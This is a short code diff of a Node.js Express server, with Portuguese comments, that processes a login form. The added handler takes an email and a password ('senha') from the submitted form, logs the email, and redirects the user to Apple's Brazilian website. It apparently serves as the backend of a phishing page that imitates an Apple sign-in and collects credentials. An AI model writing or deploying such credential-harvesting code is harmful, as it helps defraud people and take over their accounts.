@@ -3,26 +3,18 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Servir arquivos estáticos
+// Middleware
+app.use(express.urlencoded({ extended: true }));
+app.use(express.json());
 app.use(express.static('.'));
 
-// Rota principal
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
-
-// Rota de login
-app.get('/sign-in', (req, res) => {
-    res.sendFile(path.join(__dirname, 'sign-in.html'));
-});
-
-// Processar formulário de login
+// Rota para processar login
 app.post('/submit-login', (req, res) => {
-    // Aqui você processa os dados do formulário
-    console.log('Dados recebidos:', req.body);
-    res.redirect('/success.html');
+    const { email, senha } = req.body;
+    console.log('📧 Login attempt:', email);
+    res.redirect('https://www.apple.com/br/');
 });
 
-app.listen(PORT, () => {
-    console.log(`Servidor rodando na porta ${PORT}`);
+app.listen(PORT, '0.0.0.0', () => {
+    console.log(`🚀 Servidor rodando na porta ${PORT}`);
 });
